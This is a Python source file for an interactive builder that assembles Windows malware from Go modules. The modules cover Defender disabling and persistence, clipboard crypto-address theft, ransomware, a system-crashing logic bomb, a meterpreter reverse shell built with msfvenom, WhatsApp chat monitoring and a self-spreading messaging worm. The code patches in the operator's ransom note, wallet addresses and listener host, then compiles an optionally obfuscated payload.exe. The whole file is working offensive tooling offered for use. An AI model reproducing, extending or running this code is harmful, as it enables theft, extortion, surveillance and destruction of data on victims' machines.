import sys
sys.dont_write_bytecode = True
import os
import subprocess
import readline
from loading import clear_screen
import fileinput
import base64

MODULES = {
    'module/hellhound': {'desc': 'Gains persistence and disables Defender protections'},
    'module/gremlin': {'desc': 'Hijacks clipboard crypto addresses'},
    'module/blackice': {'desc': 'Blacks out the screen to disrupt user activity'},
    'module/logicbomb': {'desc': 'Blocks input and triggers DoS on the target'},
    'module/silverhandghost': {'desc': 'Provides a reverse shell for remote access'},
    'module/krash': {'desc': 'Wipes data and crashes the system using ransomware'},
    'module/overwatch': {'desc': 'Monitors all victims Whatsapp chats'},
    'module/bartmossbrainworm': {'desc': 'A worm that spreads itself through messaging apps'},
}

MODULE_CHAIN = []

BUILD_OPTIONS = {
    'EXE_NAME': 'payload.exe',
    'OBFUSCATE': False,
}

MODULE_OPTIONS = {
    'module/hellhound': {
        'PERSISTENCE': 'true',
        'DEFENDER_EXCLUDE': 'true',
    },
    'module/gremlin': {
        'BTC_ADDRESS': '1BitcoinPredefinedAddressExample1234',
        'ETH_ADDRESS': '0xEthereumPredefinedAddress1234567890abcdef',
        'BEP20_ADDRESS': '0xBEP20PredefinedAddress1234567890abcdef',
        'SOL_ADDRESS': 'So1anaPredefinedAddressExample1234567890',
    },
    'module/blackice': {
        'DURATION': '60',
    },
    'module/logicbomb': {
        'BLOCK_INPUT': 'true',
        'TRIGGER_DELAY': '10',
    },
    'module/silverhandghost': {
        'LHOST': '0.0.0.0',
        'LPORT': '4444',
        'KEY': 'changeme',
    },
    'module/krash': {
        'NOTE': 'Your ransom note here',
    },
    'module/overwatch': {},
    'module/bartmossbrainworm': {
        'MESSAGE': 'Hello from BartmossBrainworm!'
    },
}

COMMANDS = ['use', 'build', 'clear', 'delete', 'show modules', 'show options', 'exit', 'set']

YELLOW = "\033[93m"
RED = "\033[91m"
GREEN = "\033[92m"
PINK = "\033[38;2;224;147;217m"
RESET = "\033[0m"

ASCII_ART = f'''
                                                -----
                                              /      \
                                          
       {RED}:================:{RESET}                     "    )/
      {RED}/||              ||{RESET}                      )_ /*
     {RED}/ ||    {PINK}System{RESET}    {RED}||{RESET}                           *
    {RED}|  ||     {PINK}Down{RESET}     {RED}||{RESET}                    (=====~*~======)
     {RED}\\ || {PINK} Please wait{RESET} {RED}||{RESET}                   0      \\ /       0
       {RED}=================={RESET}                //   (====*====)   ||
{RED}........... /      \\.............{RESET}      //         *         ||
{RED}:\\        ############            \\{RESET}    ||    (=====*======)  ||
{RED}: --------------------------------- {RESET}    V          *          V
{RED}: |  *   |__________|| ::::::::::  |{RESET}     o   (======*=======) o
{RED}\\ |      |          ||   .......   |{RESET}     \\         *         ||
{RED}  --------------------------------- 8{RESET}    ||   (=====*======)  //
{RED}                                     8{RESET}    V         *         V
{RED}  --------------------------------- 8{RESET}    =|=;  (==/ * \\==)   =|=
{RED}  \\   ###########################  \\{RESET}    / ! \\     _ * __    / | \\
{RED}   \\  +++++++++++++++++++++++++++   \\{RESET}   ! !  !  (__/ \\__)  !  !  !
{RED}    \\ ++++++++++++++++++++++++++++   \\{RESET}         0 \\ \\V/ / 0
{RED}     \\________________________________\\{RESET}      ()   \\o o/   ()
{RED}      *********************************{RESET}      ()           ()
'''

def print_ascii_art():
    print(ASCII_ART)

def print_selected_modules():
    if MODULE_CHAIN:
        print("Selected modules:")
        for idx, mod in enumerate(MODULE_CHAIN, 1):
            print(f"  {idx} -> {PINK}{mod}{RESET}")
    else:
        print("No modules selected.")

def print_ui():
    clear_screen()
    print_ascii_art()
    print_selected_modules()
    print()

def get_module_names():
    names = list(MODULES.keys())
    short_names = [n.split('/', 1)[-1] for n in names]
    return names + short_names

def resolve_module_name(name):
    if name in MODULES:
        return name
    modname = f"module/{name}"
    if modname in MODULES:
        return modname
    return None

def shell_completer(text, state):
    buffer = readline.get_line_buffer()
    line = buffer.split()
    if not line:
        opts = COMMANDS + get_module_names()
    elif line[0] == 'use':
        opts = [m for m in get_module_names() if m.startswith(text)]    
    else:
        opts = [c for c in COMMANDS if c.startswith(text)]
    if state < len(opts):
        return opts[state] + ' '
    return None

def print_modules():
    print("\nAvailable modules:")
    for name, info in MODULES.items():
        short_name = name.split('/', 1)[-1]
        print(f"  {PINK}{short_name:<18}{RESET} {info.get('desc', '')}")
    print()

def print_global_options():
    print(f"{'Option':<15} | Value")
    print("-"*30)
    for k, v in BUILD_OPTIONS.items():
        print(f"{k:<15} | {v}")
    print()

def print_module_options(module):
    opts = MODULE_OPTIONS.get(module)
    if not opts:
        print(f"No options for module: {module}")
        return
    print(f"{'Option':<15} | Value")
    print("-"*30)
    for k, v in opts.items():
        print(f"{k:<15} | {v}")
    print()

def print_options():
    print(f"{'Option':<15} | Value")
    print("-"*30)
    for k, v in BUILD_OPTIONS.items():
        print(f"{k:<15} | {v}")
    print()

def colorize_message(msg):
    lower = msg.lower()
    if any(word in lower for word in ["fail", "error", "unknown", "no modules to remove", "usage"]):
        return f"{RED}{msg}{RESET}"
    elif any(word in lower for word in ["final merged exe", "single module built", "set ", "removed module", "all selected modules cleared", "using module"]):
        return f"{GREEN}{msg}{RESET}"
    else:
        return f"{YELLOW}{msg}{RESET}"

def patch_krash_note(note):
    go_path = os.path.join('MODULE', 'krash.go')
    with open(go_path, 'r') as f:
        lines = f.readlines()
    with open(go_path, 'w') as f:
        for line in lines:
            if 'message := ' in line and 'YOUR NOTE HERE' in line:
                f.write(f'    message := "{note}\\n"\n')
            else:
                f.write(line)
    return lines

def restore_krash_go(original_lines):
    go_path = os.path.join('MODULE', 'krash.go')
    with open(go_path, 'w') as f:
        f.writelines(original_lines)

def patch_silverhandghost_base64(exe_path):
    go_path = os.path.join('MODULE', 'silverhandghost.go')
    with open(exe_path, 'rb') as f:
        b64 = base64.b64encode(f.read()).decode()
    with open(go_path, 'r') as f:
        lines = f.readlines()
    with open(go_path, 'w') as f:
        for line in lines:
            if 'base64String :=' in line:
                f.write(f'    base64String := "{b64}"\n')
            else:
                f.write(line)
    return lines 

def restore_silverhandghost_go(original_lines):
    go_path = os.path.join('MODULE', 'silverhandghost.go')
    with open(go_path, 'w') as f:
        f.writelines(original_lines)

def patch_hellhound_options(persistence, defender_exclude):
    go_path = os.path.join('MODULE', 'hellhound.go')
    with open(go_path, 'r') as f:
        lines = f.readlines()
    new_lines = []
    for line in lines:
        # Persistence: registry key
        if "Set-ItemProperty -Path 'HKCU:Software" in line:
            if persistence.lower() in ("true", "1", "yes", "on"):
                new_lines.append(line.lstrip('#'))
            else:
                if not line.lstrip().startswith('#'):
                    new_lines.append('#' + line)
                else:
                    new_lines.append(line)
        # Defender exclusion
        elif "Add-MpPreference -ExclusionPath" in line or "Set-MpPreference -DisableRealtimeMonitoring" in line:
            if defender_exclude.lower() in ("true", "1", "yes", "on"):
                new_lines.append(line.lstrip('#'))
            else:
                if not line.lstrip().startswith('#'):
                    new_lines.append('#' + line)
                else:
                    new_lines.append(line)
        else:
            new_lines.append(line)
    with open(go_path, 'w') as f:
        f.writelines(new_lines)
    return lines

def restore_hellhound_go(original_lines):
    go_path = os.path.join('MODULE', 'hellhound.go')
    with open(go_path, 'w') as f:
        f.writelines(original_lines)

def patch_gremlin_addresses(btc_address, eth_address, bep20_address, sol_address):
    go_path = os.path.join('MODULE', 'gremlin.go')
    with open(go_path, 'r') as f:
        lines = f.readlines()
    new_lines = []
    for line in lines:
        if 'predefinedBitcoinAddress' in line:
            new_lines.append(f'\tpredefinedBitcoinAddress  = "{btc_address}"\n')
        elif 'predefinedEthereumAddress' in line:
            new_lines.append(f'\tpredefinedEthereumAddress = "{eth_address}"\n')
        elif 'predefinedBEP20Address' in line:
            new_lines.append(f'\tpredefinedBEP20Address    = "{bep20_address}"\n')
        elif 'predefinedSolanaAddress' in line:
            new_lines.append(f'\tpredefinedSolanaAddress   = "{sol_address}"\n')
        else:
            new_lines.append(line)
    with open(go_path, 'w') as f:
        f.writelines(new_lines)
    return lines

def restore_gremlin_go(original_lines):
    go_path = os.path.join('MODULE', 'gremlin.go')
    with open(go_path, 'w') as f:
        f.writelines(original_lines)

def patch_blackice_options(duration):
    go_path = os.path.join('MODULE', 'blackice.go')
    with open(go_path, 'r') as f:
        lines = f.readlines()
    new_lines = []
    for line in lines:
        if '"/t",' in line:
            new_lines.append(f'\tcmd := exec.Command("shutdown", "/s", "/t", "{duration}")\n')
        else:
            new_lines.append(line)
    with open(go_path, 'w') as f:
        f.writelines(new_lines)
    return lines

def restore_blackice_go(original_lines):
    go_path = os.path.join('MODULE', 'blackice.go')
    with open(go_path, 'w') as f:
        f.writelines(original_lines)

def patch_logicbomb_options(block_input, trigger_delay):
    go_path = os.path.join('MODULE', 'logicbomb.go')
    with open(go_path, 'r') as f:
        lines = f.readlines()
    new_lines = []
    for line in lines:
        if 'blockInput.Call(1)' in line:
            if block_input.lower() in ("true", "1", "yes", "on"):
                new_lines.append(line.lstrip('#'))
            else:
                if not line.lstrip().startswith('#'):
                    new_lines.append('#' + line)
                else:
                    new_lines.append(line)
        elif 'time.Sleep(' in line and '*' in line:
            # This is the sleep in the loop
            new_lines.append(f'\t\ttime.Sleep({trigger_delay} * time.Second)\n')
        else:
            new_lines.append(line)
    with open(go_path, 'w') as f:
        f.writelines(new_lines)
    return lines

def restore_logicbomb_go(original_lines):
    go_path = os.path.join('MODULE', 'logicbomb.go')
    with open(go_path, 'w') as f:
        f.writelines(original_lines)

def patch_silverhandghost_options(lhost, lport, key):
    return None

def restore_silverhandghost_go(original_lines):
    pass

def patch_overwatch_options():
    return None

def restore_overwatch_go(original_lines):
    pass

def patch_bartmossbrainworm_message(message):
    go_path = os.path.join('MODULE', 'bartmossbrainworm.go')
    with open(go_path, 'r') as f:
        lines = f.readlines()
    with open(go_path, 'w') as f:
        for line in lines:
            if 'predefinedMessage :=' in line or 'predefinedMessage :=' in line:
                f.write(f'\tpredefinedMessage := "{message}"\n')
            elif 'predefinedMessage :=' not in line and 'predefinedMessage :=' not in line and 'predefinedMessage' in line and '="' in line:
                # fallback for any other assignment
                f.write(f'\tpredefinedMessage := "{message}"\n')
            elif 'predefinedMessage' in line and 'Hello from Rod!' in line:
                f.write(f'\tpredefinedMessage := "{message}"\n')
            else:
                f.write(line)
    return lines

def restore_bartmossbrainworm_go(original_lines):
    go_path = os.path.join('MODULE', 'bartmossbrainworm.go')
    with open(go_path, 'w') as f:
        f.writelines(original_lines)

def generate_msfvenom_exe(lhost, lport, output_path):
    import subprocess
    cmd = [
        'msfvenom',
        '-p', 'windows/x64/meterpreter/reverse_http',
        f'LHOST={lhost}',
        f'LPORT={lport}',
        '-f', 'exe',
        '-o', output_path
    ]
    result = subprocess.run(cmd, capture_output=True)
    if result.returncode != 0:
        raise RuntimeError(f"msfvenom failed: {result.stderr.decode()}")


def shell():
    current_module = None
    readline.set_completer(shell_completer)
    readline.parse_and_bind('tab: complete')
    output_lines = []
    while True:
        try:
            print_ui()
            if output_lines:
                for line in output_lines:
                    print(colorize_message(line))
            prompt_num = len(MODULE_CHAIN) + 1
            prompt = f"{PINK}{prompt_num} * > {RESET}"
            print()
            cmdline = input(prompt)
            parts = cmdline.strip().split()
            output_lines = []
            if not parts:
                continue
            cmd = parts[0].lower()
            if cmd == 'use':
                if len(parts) < 2:
                    output_lines.append("Usage: use <module>")
                else:
                    modname = resolve_module_name(parts[1])
                    if not modname:
                        output_lines.append(f"Unknown module: {parts[1]}")
                    elif modname in MODULE_CHAIN:
                        output_lines.append(f"Module already selected: {modname}")
                    else:
                        current_module = modname
                        output_lines.append(f"Using module: {current_module}")
                        MODULE_CHAIN.append(current_module)
            elif cmd == 'build':
                if not MODULE_CHAIN:
                    output_lines.append("No modules in chain. Use 'use <module>' to add modules.")
                else:
                    loot_dir = os.path.abspath(os.path.join(os.getcwd(), '.LOOT'))
                    os.makedirs(loot_dir, exist_ok=True)
                    
                    if len(MODULE_CHAIN) == 1:
                        modname = MODULE_CHAIN[0]
                        output_lines.append(f"Building single module: {modname}")
                        
                        go_path = modname.replace('module/', 'MODULE/') + '.go'
                        krash_original = None
                        silverhandghost_original = None
                        hellhound_original = None
                        gremlin_original = None
                        blackice_original = None
                        logicbomb_original = None
                        overwatch_original = None
                        bartmossbrainworm_original = None
                        
                        if modname == 'module/krash':
                            note = MODULE_OPTIONS.get('module/krash', {}).get('NOTE', 'YOUR NOTE HERE')
                            krash_original = patch_krash_note(note)
                        elif modname == 'module/silverhandghost':
                            opts = MODULE_OPTIONS.get('module/silverhandghost', {})
                            lhost = opts.get('LHOST', '0.0.0.0')
                            lport = opts.get('LPORT', '4444')
                            key = opts.get('KEY', 'changeme')
                            payload_path = os.path.join('.LOOT', 'silverhandghost_payload.exe')
                            try:
                                generate_msfvenom_exe(lhost, lport, payload_path)
                            except Exception as e:
                                output_lines.append(f"Failed to generate msfvenom payload: {e}")
                                continue
                            silverhandghost_original = patch_silverhandghost_base64(payload_path)
                        elif modname == 'module/hellhound':
                            opts = MODULE_OPTIONS.get('module/hellhound', {})
                            persistence = opts.get('PERSISTENCE', 'true')
                            defender_exclude = opts.get('DEFENDER_EXCLUDE', 'true')
                            hellhound_original = patch_hellhound_options(persistence, defender_exclude)
                        elif modname == 'module/gremlin':
                            opts = MODULE_OPTIONS.get('module/gremlin', {})
                            btc_address = opts.get('BTC_ADDRESS', '1BitcoinPredefinedAddressExample1234')
                            eth_address = opts.get('ETH_ADDRESS', '0xEthereumPredefinedAddress1234567890abcdef')
                            bep20_address = opts.get('BEP20_ADDRESS', '0xBEP20PredefinedAddress1234567890abcdef')
                            sol_address = opts.get('SOL_ADDRESS', 'So1anaPredefinedAddressExample1234567890')
                            gremlin_original = patch_gremlin_addresses(btc_address, eth_address, bep20_address, sol_address)
                        elif modname == 'module/blackice':
                            opts = MODULE_OPTIONS.get('module/blackice', {})
                            duration = opts.get('DURATION', '60')
                            blackice_original = patch_blackice_options(duration)
                        elif modname == 'module/logicbomb':
                            opts = MODULE_OPTIONS.get('module/logicbomb', {})
                            block_input = opts.get('BLOCK_INPUT', 'true')
                            trigger_delay = opts.get('TRIGGER_DELAY', '10')
                            logicbomb_original = patch_logicbomb_options(block_input, trigger_delay)
                        elif modname == 'module/overwatch':
                            overwatch_original = patch_overwatch_options()
                        elif modname == 'module/bartmossbrainworm':
                            message = MODULE_OPTIONS.get('module/bartmossbrainworm', {}).get('MESSAGE', 'Hello from BartmossBrainworm!')
                            bartmossbrainworm_original = patch_bartmossbrainworm_message(message)
                        
                        module_name = modname.split('/')[-1]
                        final_name = f"{module_name}.exe"
                        final_path = os.path.abspath(os.path.join(loot_dir, final_name))
                        
                        output_lines.append(f"[*] Building single module: {final_name}")
                        obf_flag = []
                        if BUILD_OPTIONS.get('OBFUSCATE'):
                            obf_flag = ['--obfuscate']
                        
                        from loading import loading_state
                        with loading_state(message="Building, please wait...", print_ascii_art=print_ascii_art):
                            result = subprocess.run([sys.executable, 'compiler.py', '--go_file', go_path, '--output_exe', final_name] + obf_flag)
                        
                        if result.returncode == 0:
                            output_lines.append(f"Single module built: {final_path}")
                        else:
                            output_lines.append("Failed to create single module EXE.")
                        
                        if krash_original:
                            restore_krash_go(krash_original)
                        if silverhandghost_original:
                            restore_silverhandghost_go(silverhandghost_original)
                        if hellhound_original:
                            restore_hellhound_go(hellhound_original)
                        if gremlin_original:
                            restore_gremlin_go(gremlin_original)
                        if blackice_original:
                            restore_blackice_go(blackice_original)
                        if logicbomb_original:
                            restore_logicbomb_go(logicbomb_original)
                        if overwatch_original:
                            restore_overwatch_go(overwatch_original)
                        if bartmossbrainworm_original:
                            restore_bartmossbrainworm_go(bartmossbrainworm_original)
                        
                        MODULE_CHAIN.clear()
                    else:
                        output_lines.append(f"Building merged malware with {len(MODULE_CHAIN)} modules...")
                        go_paths = []
                        krash_original = None
                        silverhandghost_original = None
                        hellhound_original = None
                        gremlin_original = None
                        blackice_original = None
                        logicbomb_original = None
                        overwatch_original = None
                        bartmossbrainworm_original = None
                        for modname in MODULE_CHAIN:
                            go_path = modname.replace('module/', 'MODULE/') + '.go'
                            if modname == 'module/krash':
                                note = MODULE_OPTIONS.get('module/krash', {}).get('NOTE', 'YOUR NOTE HERE')
                                krash_original = patch_krash_note(note)
                            if modname == 'module/silverhandghost':
                                opts = MODULE_OPTIONS.get('module/silverhandghost', {})
                                lhost = opts.get('LHOST', '0.0.0.0')
                                lport = opts.get('LPORT', '4444')
                                key = opts.get('KEY', 'changeme')
                                payload_path = os.path.join('.LOOT', 'silverhandghost_payload.exe')
                                try:
                                    generate_msfvenom_exe(lhost, lport, payload_path)
                                except Exception as e:
                                    output_lines.append(f"Failed to generate msfvenom payload: {e}")
                                    continue
                                silverhandghost_original = patch_silverhandghost_base64(payload_path)
                            if modname == 'module/hellhound':
                                opts = MODULE_OPTIONS.get('module/hellhound', {})
                                persistence = opts.get('PERSISTENCE', 'true')
                                defender_exclude = opts.get('DEFENDER_EXCLUDE', 'true')
                                hellhound_original = patch_hellhound_options(persistence, defender_exclude)
                            if modname == 'module/gremlin':
                                opts = MODULE_OPTIONS.get('module/gremlin', {})
                                btc_address = opts.get('BTC_ADDRESS', '1BitcoinPredefinedAddressExample1234')
                                eth_address = opts.get('ETH_ADDRESS', '0xEthereumPredefinedAddress1234567890abcdef')
                                bep20_address = opts.get('BEP20_ADDRESS', '0xBEP20PredefinedAddress1234567890abcdef')
                                sol_address = opts.get('SOL_ADDRESS', 'So1anaPredefinedAddressExample1234567890')
                                gremlin_original = patch_gremlin_addresses(btc_address, eth_address, bep20_address, sol_address)
                            if modname == 'module/blackice':
                                opts = MODULE_OPTIONS.get('module/blackice', {})
                                duration = opts.get('DURATION', '60')
                                blackice_original = patch_blackice_options(duration)
                            if modname == 'module/logicbomb':
                                opts = MODULE_OPTIONS.get('module/logicbomb', {})
                                block_input = opts.get('BLOCK_INPUT', 'true')
                                trigger_delay = opts.get('TRIGGER_DELAY', '10')
                                logicbomb_original = patch_logicbomb_options(block_input, trigger_delay)
                            if modname == 'module/overwatch':
                                overwatch_original = patch_overwatch_options()
                            if modname == 'module/bartmossbrainworm':
                                message = MODULE_OPTIONS.get('module/bartmossbrainworm', {}).get('MESSAGE', 'Hello from BartmossBrainworm!')
                                bartmossbrainworm_original = patch_bartmossbrainworm_message(message)
                            go_paths.append(go_path)
                        final_name = BUILD_OPTIONS['EXE_NAME']
                        final_path = os.path.abspath(os.path.join(loot_dir, final_name))
                        output_lines.append(f"[*] Merging Go modules into final EXE: {final_name}")
                        obf_flag = []
                        if BUILD_OPTIONS.get('OBFUSCATE'):
                            obf_flag = ['--obfuscate']
                        from loading import loading_state
                        with loading_state(message="Building, please wait...", print_ascii_art=print_ascii_art):
                            result = subprocess.run([sys.executable, 'compiler.py', '--merge'] + go_paths + [final_path] + obf_flag)
                        if result.returncode == 0:
                            output_lines.append(f"Final merged EXE: {final_path}")
                        else:
                            output_lines.append("Failed to create merged EXE.")
                        if krash_original:
                            restore_krash_go(krash_original)
                        if silverhandghost_original:
                            restore_silverhandghost_go(silverhandghost_original)
                        if hellhound_original:
                            restore_hellhound_go(hellhound_original)
                        if gremlin_original:
                            restore_gremlin_go(gremlin_original)
                        if blackice_original:
                            restore_blackice_go(blackice_original)
                        if logicbomb_original:
                            restore_logicbomb_go(logicbomb_original)
                        if overwatch_original:
                            restore_overwatch_go(overwatch_original)
                        if bartmossbrainworm_original:
                            restore_bartmossbrainworm_go(bartmossbrainworm_original)
                        MODULE_CHAIN.clear()
            elif cmd == 'clear':
                MODULE_CHAIN.clear()
                output_lines.append("All selected modules cleared.")
            elif cmd == 'delete':
                if MODULE_CHAIN:
                    removed = MODULE_CHAIN.pop()
                    output_lines.append(f"Removed module: {removed}")
                else:
                    output_lines.append("No modules to remove.")
            elif cmd == 'show':
                if len(parts) < 2:
                    output_lines.append("Usage: show <modules|options|global options>")
                else:
                    subcmd = parts[1].lower()
                    if subcmd == 'modules':
                        output_lines.append("")
                        for name, info in MODULES.items():
                            short_name = name.split('/', 1)[-1]
                            output_lines.append(f"  {PINK}{short_name:<18}{RESET} {info.get('desc', '')}")
                        output_lines.append("")
                    elif subcmd == 'global' and len(parts) > 2 and parts[2].lower() == 'options':
                        from io import StringIO
                        buf = StringIO()
                        buf.write(f"{'Option':<15} | Value\n")
                        buf.write("-"*30 + "\n")
                        for k, v in BUILD_OPTIONS.items():
                            buf.write(f"{k:<15} | {v}\n")
                        output_lines.append(buf.getvalue())
                    elif subcmd == 'options':
                        if MODULE_CHAIN:
                            mod = MODULE_CHAIN[-1]
                            opts = MODULE_OPTIONS.get(mod)
                            if not opts:
                                output_lines.append(f"No options for module: {mod}")
                            else:
                                buf = []
                                buf.append(f"{'Option':<15} | Value")
                                buf.append("-"*30)
                                for k, v in opts.items():
                                    buf.append(f"{k:<15} | {v}")
                                output_lines.extend(buf)
                        else:
                            output_lines.append("No module selected. Use 'use <module>' to select one.")
                    else:
                        output_lines.append(f"Unknown show command: {subcmd}")
            elif cmd == 'set':
                if len(parts) < 3:
                    output_lines.append("Usage: set <option> <value>")
                else:
                    opt = parts[1]
                    val = parts[2]
                    if MODULE_CHAIN:
                        mod = MODULE_CHAIN[-1]
                        if mod in MODULE_OPTIONS and opt in MODULE_OPTIONS[mod]:
                            MODULE_OPTIONS[mod][opt] = val
                            output_lines.append(f"Set {opt} to {val} for {mod}")
                            if mod == 'module/bartmossbrainworm' and opt == 'MESSAGE':
                                patch_bartmossbrainworm_message(val)
                        elif opt.upper() in BUILD_OPTIONS:
                            if opt.upper() == 'OBFUSCATE':
                                BUILD_OPTIONS[opt.upper()] = val.lower() in ('1', 'true', 'yes', 'on')
                            else:
                                BUILD_OPTIONS[opt.upper()] = val
                            output_lines.append(f"Set {opt} to {BUILD_OPTIONS[opt.upper()]}")
                        else:
                            output_lines.append(f"Unknown option: {opt}")
                    else:
                        if opt.upper() in BUILD_OPTIONS:
                            if opt.upper() == 'OBFUSCATE':
                                BUILD_OPTIONS[opt.upper()] = val.lower() in ('1', 'true', 'yes', 'on')
                            else:
                                BUILD_OPTIONS[opt.upper()] = val
                            output_lines.append(f"Set {opt} to {BUILD_OPTIONS[opt.upper()]}")
                        else:
                            output_lines.append(f"Unknown option: {opt}")
            elif cmd in ('exit', 'quit'):
                print_ui()
                print("Exiting...")
                print()
                break
            else:
                output_lines.append(f"Unknown command: {cmd}")
        except (KeyboardInterrupt, EOFError):
            print()
            continue

if __name__ == "__main__":
    shell() 